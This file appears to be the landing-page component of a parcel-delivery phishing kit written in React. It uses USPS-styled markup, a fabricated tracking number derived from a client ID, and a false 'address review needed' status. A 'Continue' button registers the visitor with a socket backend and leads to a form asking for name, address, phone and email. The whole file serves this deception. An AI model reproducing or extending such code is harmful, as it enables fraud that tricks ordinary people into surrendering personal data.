import { useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { getClientId, setActivated } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function buildOrderNumber(clientId: string) {
  const seed = (clientId || 'parcelpath-order-seed').replace(/[^a-zA-Z0-9]/g, '');
  let hash = 0;
  for (let i = 0; i < seed.length; i += 1) {
    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
  }

  const segment = (length: number, salt: number) => {
    let value = (hash ^ salt) >>> 0;
    let out = '';
    while (out.length < length) {
      value = (value * 1664525 + 1013904223) >>> 0;
      out += String(value % 10);
    }
    return out.slice(0, length);
  };

  return `${segment(4, 0x9e37)} ${segment(4, 0x85eb)} ${segment(4, 0xc2b2)} ${segment(4, 0x27d4)} ${segment(4, 0x1656)} ${segment(2, 0xa5a5)}`;
}

export default function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
  const orderPlacedDate = new Intl.DateTimeFormat('en-US', {
    month: 'long',
    day: 'numeric',
    year: 'numeric',
  }).format(new Date());

  const handleContinue = () => {
    if (loading) return;
    setLoading(true);

    try {
      const clientId = getClientId();
      setActivated(true);

      const registerTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Shanghai',
        hour12: false,
      });

      let started = false;
      const start = () => {
        if (started) return;
        started = true;

        socket.emit('attach-client', { clientId }, () => {
          socket.emit('join-page', 'home');
          socket.emit('register-user', { clickTime: registerTime, clientId }, () => {
            setLoading(false);
            navigate('/info');
          });
        });
      };

      if (!socket.connected) {
        socket.connect();
        socket.once('connect', start);
        window.setTimeout(start, 900);
        return;
      }

      start();
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="alz-page alz-usps-page alz-home-compact">
      <section className="alz-usps-hero" aria-hidden="true">
        <div className="alz-usps-hero-panel">
          <div className="alz-usps-hero-panel-top" />
          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-short" />
          <div className="alz-usps-hero-panel-line" />
          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-mid" />
          <div className="alz-usps-hero-panel-card" />
        </div>
        <div className="alz-usps-hero-blur" />
        <div className="alz-usps-hero-phone">
          <div className="alz-usps-hero-phone-notch" />
          <div className="alz-usps-hero-phone-screen">
            <div className="alz-usps-hero-appbar" />
            <div className="alz-usps-hero-card alz-usps-hero-card-top" />
            <div className="alz-usps-hero-card alz-usps-hero-card-mid" />
            <div className="alz-usps-hero-card alz-usps-hero-card-low" />
          </div>
        </div>
      </section>

      <div className="alz-shell">
        <section className="alz-usps-intro">
          <div className="alz-usps-intro-copy">
            <div className="alz-usps-eyebrow">Delivery Update</div>
            <h1 className="alz-usps-title">Confirm delivery details</h1>
            <p className="alz-usps-lead">
              One quick review is needed before delivery can continue.
            </p>
            <div className="alz-brand-row alz-home-brand-row">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>
            <div className="alz-usps-action-row alz-home-action-row">
              <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
                {loading ? 'Opening...' : 'Continue'}
              </button>
              <p className="alz-usps-action-note">Takes about 2 minutes.</p>
            </div>
          </div>
          <div className="alz-usps-track-card">
            <div className="alz-usps-track-head">
              <div className="alz-usps-track-label">Tracking Number</div>
              <div className="alz-usps-track-badge">ACTIVE</div>
            </div>
            <div className="alz-usps-track-number">{orderNumber}</div>
            <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
            <div className="alz-usps-track-state">Address review needed</div>
          </div>
        </section>

        <section className="alz-home-quick-grid">
          <article className="alz-usps-service-card alz-home-quick-card">
            <div className="alz-usps-service-kicker">What you need</div>
            <div className="alz-home-quick-list">
              <div>Name and address</div>
              <div>Phone and email</div>
              <div>Tap continue</div>
            </div>
          </article>
          <article className="alz-usps-service-card alz-home-quick-card">
            <div className="alz-usps-service-kicker">Shipment status</div>
            <div className="alz-home-quick-list">
              <div>Current: Waiting for review</div>
              <div>Service: Standard parcel</div>
              <div>Next: Confirm recipient details</div>
            </div>
          </article>
        </section>

        <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
        <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
      </div>
    </div>
  );
}
